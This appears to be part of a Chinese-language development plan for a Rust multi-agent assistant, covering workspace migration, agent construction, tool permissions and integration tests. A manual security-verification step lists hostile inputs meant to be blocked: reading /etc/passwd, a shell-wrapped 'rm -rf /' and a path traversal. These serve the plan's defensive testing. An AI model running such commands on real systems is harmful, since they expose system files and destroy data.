        std::fs::write(dir.path().join("SOUL.md"), "soul").unwrap();
        std::fs::write(dir.path().join("USER.md"), "user").unwrap();
        std::fs::write(dir.path().join("MEMORY.md"), "memory").unwrap();
        std::fs::write(dir.path().join("config.toml"), "[test]").unwrap();
        std::fs::create_dir(dir.path().join("uploads")).unwrap();
        std::fs::write(dir.path().join("uploads/img.jpg"), "img").unwrap();

        let migrated = migrate_if_needed(dir.path()).unwrap();
        assert!(migrated);

        // 验证文件移动到 workspace/
        let ws = dir.path().join("workspace");
        assert!(ws.join("SOUL.md").exists());
        assert!(ws.join("USER.md").exists());
        assert!(ws.join("MEMORY.md").exists());
        assert!(ws.join("uploads/img.jpg").exists());

        // 旧位置不存在
        assert!(!dir.path().join("SOUL.md").exists());

        // 标记存在
        assert!(dir.path().join(".migrated_v0.2").exists());

        // config 备份存在
        assert!(dir.path().join("config.toml.bak").exists());
    }

    #[test]
    fn test_migrate_old_subagents() {
        let dir = tempdir().unwrap();
        std::fs::write(dir.path().join("SOUL.md"), "soul").unwrap();
        // 旧子 agent 目录
        let old_sub = dir.path().join("subagents").join("coder");
        std::fs::create_dir_all(&old_sub).unwrap();
        std::fs::write(old_sub.join("SOUL.md"), "coder soul").unwrap();

        let migrated = migrate_if_needed(dir.path()).unwrap();
        assert!(migrated);

        // 验证子 agent 目录移动
        let new_sub = dir.path().join("workspace").join("subagent").join("coder");
        assert!(new_sub.exists());
        assert!(new_sub.join("SOUL.md").exists());
    }
}
```

- [ ] **Step 2: 在 src/lib.rs 导出 migrate 模块**

```rust
pub mod migrate;
```

- [ ] **Step 3: 编译 + 测试**

Run: `cargo test migrate`
Expected: 通过

- [ ] **Step 4: 提交**

```bash
git add src/migrate.rs src/lib.rs
git commit -m "feat(migrate): add v0.1 to v0.2 directory structure migration"
```

---

## Task 11: cli.rs build_agent 改造

**Files:**
- Modify: `src/channels/cli.rs`

- [ ] **Step 1: build_single_agent 用自动推导 workspace + USER.md 同步 + 工具构造用新字段**

在 `src/channels/cli.rs` 找到 `build_single_agent` 函数（约 288 行），整体替换为：

```rust
/// 构建单个 Agent 实例。返回 (Agent, 可能的 delegate 工具)
/// is_main=true 且 config 有子 Agent 时，挂载 delegate 工具并返回其引用用于后续注入 registry
async fn build_single_agent(
    config: &Config,
    config_dir: &std::path::Path,
    alias: &str,
    agent_cfg: AgentConfig,
    is_main: bool,
    audit: Option<Arc<crate::audit::AuditLog>>,
) -> Result<(Arc<Mutex<Agent>>, Option<Arc<DelegateTool>>)> {
    // workspace 自动推导（忽略配置中的 workspace 字段）
    let workspace = agent_cfg.derive_workspace(config_dir, alias);
    std::fs::create_dir_all(&workspace).ok();

    let soul_path = workspace.join("SOUL.md");
    let user_path = workspace.join("USER.md");
    let memory_path = workspace.join("MEMORY.md");

    ensure_template(&soul_path, SOUL_TEMPLATE).await?;
    ensure_template(&memory_path, MEMORY_TEMPLATE).await?;

    // USER.md 同步：子 agent 启动时从主 agent 复制覆盖
    if !is_main {
        let main_user = config_dir.join("workspace").join("USER.md");
        if main_user.exists() {
            ensure_template(&main_user, USER_TEMPLATE).await?;
            tokio::fs::copy(&main_user, &user_path).await?;
            tracing::info!(agent = alias, "synced USER.md from main agent");
        } else {
            ensure_template(&user_path, USER_TEMPLATE).await?;
        }
    } else {
        ensure_template(&user_path, USER_TEMPLATE).await?;
    }

    let soul = load_md(&soul_path).await?;
    let user = load_md(&user_path).await?;
    let memory = load_md(&memory_path).await?;
    tracing::info!(
        agent = alias,
        workspace = %workspace.display(),
        soul_path = %soul_path.display(),
        soul_len = soul.len(),
        user_len = user.len(),
        memory_len = memory.len(),
        "loaded soul/user/memory"
    );

    let (prov_id, model_alias) = Config::parse_model_ref(&agent_cfg.model)?;
    let prov_cfg = config
        .provider
        .get(prov_id)
        .cloned()
        .ok_or_else(|| anyhow::anyhow!("provider.{} not configured", prov_id))?;
    let model_cfg = prov_cfg.model.get(model_alias).cloned().ok_or_else(|| {
        anyhow::anyhow!("provider.{}.model.{} not configured", prov_id, model_alias)
    })?;

    let provider: Arc<dyn Provider> = Arc::new(OpenAiCompatibleProvider::new(
        &prov_cfg.base_url,
        &prov_cfg.api_key,
        &model_cfg.model,
        model_cfg.native_tool_calling,
    )?);

    // 构建完整工具集（用新字段）
    let mut all_tools: Vec<Arc<dyn Tool>> = vec![
        Arc::new(FileRead::new(workspace.clone(), is_main)),
        Arc::new(FileWrite::new(workspace.clone(), is_main)),
        Arc::new(FileEdit::new(workspace.clone(), is_main)),
        Arc::new(Terminal::new(
            config.tools.terminal.command_policy.clone(),
            config.tools.terminal.command_whitelist.clone(),
            workspace.clone(),
        )),
        Arc::new(WebFetch::new()?),
        Arc::new(MemoryWrite::new(memory_path.clone(), user_path.clone(), is_main)),
        Arc::new(SendImage::new(workspace.clone())),
        Arc::new(SendFile::new(workspace.clone())),
    ];
    if !config.tools.tavily.api_key.is_empty() {
        all_tools.push(Arc::new(TavilySearch::new(
            config.tools.tavily.api_key.clone(),
        )?));
    }

    // 按 denied_tools 过滤
    let denied: std::collections::HashSet<&str> =
        agent_cfg.denied_tools.iter().map(|s| s.as_str()).collect();
    let mut delegate_tool: Option<Arc<DelegateTool>> = None;
    let mut registry = ToolRegistry::new();
    for tool in all_tools {
        if !denied.contains(tool.name()) {
            registry.register(tool);
        }
    }

    // main Agent 且配置了子 Agent 时挂 delegate 工具
    let has_delegate = is_main && config.agent.len() > 1;
    if has_delegate {
        let d = Arc::new(DelegateTool::new(agent_cfg.delegate_timeout));
        registry.register(d.clone());
        delegate_tool = Some(d);
    }

    let mut system_prompt = format!(
        "# SOUL\n{}\n\n# USER\n{}\n\n# MEMORY\n{}\n\n# WORKSPACE\n{}\n\n工作目录说明：所有工具的相对路径都相对于 WORKSPACE 解析；terminal 命令在 WORKSPACE 下执行。需要写到其它位置时请使用绝对路径。",
        soul, user, memory, workspace.display()
    );
    if !provider.native_tool_calling() && !has_delegate {
        system_prompt.push_str(&build_tool_instructions(&registry.specs()));
    }
    let registry = Arc::new(registry);

    let db_path = workspace.join("sessions.db");
    let session_store = Arc::new(SessionStore::open(&db_path)?);

    let session_id = match session_store.latest_session()? {
        Some((id, _)) => id,
        None => {
            let uuid = uuid::Uuid::new_v4().to_string();
            session_store.create_session(&uuid, alias)?
        }
    };

    let detected = provider.detect_context_size().await;
    let context_size = match (model_cfg.context_size, detected) {
        (Some(cfg), Some(det)) => cfg.min(det),
        (Some(cfg), None) => cfg,
        (None, Some(det)) => det,
        (None, None) => 8192,
    };
    tracing::info!(
        agent = alias,
        configured = ?model_cfg.context_size,
        detected = ?detected,
        final = context_size,
        "context_size resolved"
    );

    let agent = Agent::new(
        config,
        provider,
        registry,
        session_store,
        session_id,
        system_prompt,
        context_size,
        workspace.clone(),
        config_dir.to_path_buf(),
        is_main,
        alias.to_string(),
        audit,
    )
    .await;

    Ok((Arc::new(Mutex::new(agent)), delegate_tool))
}
```

- [ ] **Step 2: build_agent 改用 config_dir + 构造 audit**

将 `build_agent` 函数整体替换为：

```rust
/// 构建 AgentRegistry（main + 所有子 Agent）
pub async fn build_agent(
    config: &Config,
    config_dir: &std::path::Path,
) -> Result<Arc<AgentRegistry>> {
    // 审计日志
    let log_dir = PathBuf::from(&config.log.dir);
    let audit = Arc::new(crate::audit::AuditLog::new(&log_dir));

    // 构建子 Agent（跳过 main）
    let mut sub_agents: Vec<(String, Arc<Mutex<Agent>>)> = Vec::new();
    for (alias, cfg) in &config.agent {
        if alias == "main" {
            continue;
        }
        let (agent, _) = build_single_agent(
            config, config_dir, alias, cfg.clone(), false, Some(audit.clone()),
        ).await?;
        sub_agents.push((alias.clone(), agent));
    }

    // 构建 main Agent
    let main_cfg = config
        .agent
        .get("main")
        .cloned()
        .ok_or_else(|| anyhow::anyhow!("agent.main not configured"))?;
    let (main_agent, delegate_tool) = build_single_agent(
        config, config_dir, "main", main_cfg, true, Some(audit.clone()),
    ).await?;

    let mut registry = AgentRegistry::new(main_agent);
    for (alias, agent) in sub_agents {
        registry.register_sub_agent(alias, agent);
    }
    let registry = Arc::new(registry);

    // 注入 registry 给 delegate 工具（OnceCell 延迟注入）
    if let Some(d) = delegate_tool {
        d.set_registry(registry.clone());

        let mut a = registry.main.lock().await;
        if !a.provider.native_tool_calling() {
            let instructions = build_tool_instructions(&a.tools.specs());
            a.context.system.push_str(&instructions);
        }
    }

    tracing::info!(
        sub_agents = registry.available_sub_agents().len(),
        "AgentRegistry built"
    );
    Ok(registry)
}
```

- [ ] **Step 3: 删除 resolve_md_path 辅助函数**

`resolve_md_path` 函数不再需要（workspace 自动推导后路径直接拼接），删除它。

- [ ] **Step 4: 编译验证**

Run: `cargo build`
Expected: `commands/mod.rs` 中 `build_agent(&config)` 调用报参数不匹配（Task 12 修复）

- [ ] **Step 5: 提交**

```bash
git add src/channels/cli.rs
git commit -m "refactor(cli): build_agent uses config_dir + auto-derive workspace + USER.md sync + new tool fields"
```

---

## Task 12: commands/mod.rs 改造

**Files:**
- Modify: `src/commands/mod.rs`

- [ ] **Step 1: chat_cmd / serve_cmd 加迁移 + build_agent 传 config_dir**

将 `src/commands/mod.rs` 的 `chat_cmd` 和 `serve_cmd` 函数中 `load_config_or_init` 之后加迁移调用，`build_agent` 调用加 `config_dir` 参数：

```rust
pub async fn chat_cmd(config_dir: &Path) -> Result<()> {
    let config = load_config_or_init(config_dir)?;

    // 目录结构迁移
    if crate::migrate::migrate_if_needed(config_dir)? {
        tracing::info!("directory migrated, reloading config");
        // 迁移后重新加载配置（路径可能变化）
    }

    let log_dir = PathBuf::from(&config.log.dir);
    let _ = crate::log::init(&config.log.level, &log_dir);

    let pid_file = crate::pid::PidFile::new(config_dir);
    pid_file.acquire()?;
    let _pid_guard = PidGuard(pid_file);

    let registry = crate::channels::cli::build_agent(&config, config_dir).await?;

    let cli = std::sync::Arc::new(crate::channels::CliChannel::new());
    crate::channels::Channel::run(cli, registry).await
}

pub async fn serve_cmd(config_dir: &Path) -> Result<()> {
    let config = load_config_or_init(config_dir)?;

    // 目录结构迁移
    if crate::migrate::migrate_if_needed(config_dir)? {
        tracing::info!("directory migrated, reloading config");
    }

    let log_dir = PathBuf::from(&config.log.dir);
    let _ = crate::log::init(&config.log.level, &log_dir);

    let pid_file = crate::pid::PidFile::new(config_dir);
    pid_file.acquire()?;
    let _pid_guard = PidGuard(pid_file);

    let registry = crate::channels::cli::build_agent(&config, config_dir).await?;

    // ... 后续 QQ/Web channel 启动逻辑不变
```

- [ ] **Step 2: doctor_cmd 更新 workspace 显示**

在 `doctor_cmd` 函数中，workspace 显示改为自动推导：

```rust
pub async fn doctor_cmd(config_dir: &Path) -> Result<()> {
    let cfg = load_config_or_init(config_dir)?;

    println!("config_dir: {}", config_dir.display());
    println!("log.dir: {}", cfg.log.dir);
    println!("runtime.context_threshold: {}", cfg.runtime.context_threshold);
    println!("runtime.max_iterations: {}", cfg.runtime.max_iterations);

    let agent_cfg = match cfg.agent.get("main") {
        Some(a) => a,
        None => {
            println!("\n[agent.main not configured]");
            return Ok(());
        }
    };
    // 自动推导 workspace
    let workspace = agent_cfg.derive_workspace(config_dir, "main");
    println!("\nagent.main:");
    println!("  model: {}", agent_cfg.model);
    println!("  workspace (derived): {}", workspace.display());

    // ... 后续 provider 检查逻辑不变
```

- [ ] **Step 3: remember_cmd 用自动推导路径**

```rust
pub async fn remember_cmd(text: &str, config_dir: &Path) -> Result<()> {
    let cfg = load_config_or_init(config_dir)?;
    let agent_cfg = cfg
        .agent
        .get("main")
        .cloned()
        .ok_or_else(|| anyhow::anyhow!("agent.main not configured"))?;
    let workspace = agent_cfg.derive_workspace(config_dir, "main");
    let memory_path = workspace.join("MEMORY.md");
    crate::memory::ensure_template(&memory_path, crate::memory::MEMORY_TEMPLATE).await?;
    let today = chrono::Local::now().format("%Y-%m-%d").to_string();
    let line = format!("- [{}] {}\n", today, text);
    let mut content = tokio::fs::read_to_string(&memory_path)
        .await
        .unwrap_or_default();
    content.push_str(&line);
    tokio::fs::write(&memory_path, &content).await?;
    println!("remembered: {}", text);
    Ok(())
}
```

- [ ] **Step 4: 编译验证**

Run: `cargo build`
Expected: 编译通过

- [ ] **Step 5: 测试验证**

Run: `cargo test`
Expected: 所有测试通过

- [ ] **Step 6: 提交**

```bash
git add src/commands/mod.rs
git commit -m "refactor(commands): add migration call + update build_agent/doctor/remember to use config_dir"
```

---

## Task 13: channels/qq.rs confirm_mode 改造

**Files:**
- Modify: `src/channels/qq.rs`

- [ ] **Step 1: 检查 qq.rs 是否有 per-channel confirm 逻辑**

搜索 `src/channels/qq.rs` 中 `confirm_mode` 或 `qq_confirm_mode` 的引用。

根据 ADR-0011，`execute_tool_calls` 已经在 runner.rs 改为全局 confirm_mode，qq.rs 不应再有 per-channel 拦截逻辑。

如果 qq.rs 中有读取 `agent.qq_confirm_mode` 的代码，改为读取 `agent.confirm_mode`。

- [ ] **Step 2: 更新字段引用**

在 `src/channels/qq.rs` 中搜索 `qq_confirm_mode`，全部替换为 `confirm_mode`（字段已在 Task 4 重命名）。

如果 qq.rs 调用 `execute_tool_calls` 时传的是 `&self.qq_confirm_mode`，改为 `&self.confirm_mode`。

实际上 `execute_tool_calls` 是在 `agent/mod.rs` 的 `handle_message_streaming` 中调用的，qq.rs 不直接调用。所以 qq.rs 只需确保 `Agent` 结构体字段访问正确即可。

Run: `cargo build`
Expected: 编译通过

- [ ] **Step 3: 提交（如有变更）**

```bash
git add src/channels/qq.rs
git commit -m "refactor(qq): use global confirm_mode field"
```

---

## Task 14: 集成测试 + 全量验证

**Files:**
- 无新文件

- [ ] **Step 1: 全量编译**

Run: `cargo build`
Expected: 编译通过，无错误

- [ ] **Step 2: 全量测试**

Run: `cargo test`
Expected: 所有测试通过

- [ ] **Step 3: 检查 clippy 警告**

Run: `cargo clippy`
Expected: 无严重警告

- [ ] **Step 4: 手动验证迁移逻辑**

```bash
# 模拟旧目录结构
mkdir -p /tmp/llaia-test-old
echo "soul" > /tmp/llaia-test-old/SOUL.md
echo "user" > /tmp/llaia-test-old/USER.md
echo "memory" > /tmp/llaia-test-old/MEMORY.md
echo "[provider.default]" > /tmp/llaia-test-old/config.toml

# 运行迁移
cargo run -- chat --config-dir /tmp/llaia-test-old
# 预期：日志显示迁移完成，文件移动到 workspace/

# 验证
ls /tmp/llaia-test-old/workspace/
# 预期：SOUL.md USER.md MEMORY.md
ls /tmp/llaia-test-old/.migrated_v0.2
# 预期：标记文件存在
```

- [ ] **Step 5: 手动验证路径防御**

启动 `cargo run -- chat`，让 agent 尝试：
- `terminal: cat /etc/passwd` → 应被黑名单拦截
- `terminal: bash -c "rm -rf /"` → 应被 shell 包装拒绝
- `file_read: ../outside.txt` → 应被边界检查拒绝
- `file_read: test.txt`（workspace 内）→ 应成功

- [ ] **Step 6: 最终提交**

```bash
git add -A
git commit -m "test: verify P3-a workspace isolation + path defense integration"
```

---

## 自检

### Spec 覆盖

- [x] §1 新目录结构 → Task 3 (default_for_workspace) + Task 10 (migrate) + Task 11 (build_agent)
- [x] §2 terminal cwd 固定 → Task 7 (Terminal.execute current_dir)
- [x] §3.1 命令策略 → Task 7 (check_command_policy)
- [x] §3.2 三层路径防御 → Task 1 (path_guard) + Task 7 (check_path_safety)
- [x] §3.3 file 工具路径策略 → Task 6 (file.rs 用 path_guard)
- [x] §4 confirm_mode 全局化 → Task 3 (config 默认 none) + Task 4 (Agent.confirm_mode) + Task 5 (runner 全局)
- [x] §5 file 工具主 agent subagent 权限 → Task 6 (is_main 分层)
- [x] §7.1 delegate file_paths + .inbox → Task 9 (delegate 改造)
- [x] §7.2 delegate 返回值 {text, output_files} → Task 9 (delegate 改造)
- [x] §7.3 USER.md 启动同步 → Task 11 (build_single_agent 同步逻辑)
- [x] §8 audit.log → Task 2 (audit.rs) + Task 5 (runner 写入)
- [x] 目录迁移 → Task 10 (migrate.rs) + Task 12 (commands 调用)
- [x] AgentConfig 字段废弃 → Task 3 (derive_workspace) + Task 11 (忽略配置字段)
- [x] memory 工具子 agent 拒写 → Task 8 (memory.rs is_main)

### 类型一致性

- `path_guard::validate_path(workspace, path, extra_readable)` 签名在 Task 1 定义，Task 6/9 使用一致
- `Terminal::new(command_policy, command_whitelist, workspace)` 在 Task 7 定义，Task 11 使用一致
- `FileRead::new(workspace, is_main)` 在 Task 6 定义，Task 11 使用一致
- `MemoryWrite::new(memory_path, user_path, is_main)` 在 Task 8 定义，Task 11 使用一致
- `Agent::new` 新签名在 Task 4 定义，Task 11 使用一致
- `execute_tool_calls` 新签名在 Task 5 定义，Task 4 调用一致
- `build_agent(config, config_dir)` 在 Task 11 定义，Task 12 调用一致

### 遗漏检查

- QqChannel 的 `confirm_mode` 字段访问：Task 13 已处理
- send_media 工具的 workspace：无需改造（已有 workspace 字段，不受 is_main 影响）
- web channel 的 workspace：无需改造（从 registry.main 读取）
- pid.rs / log.rs：无需改造
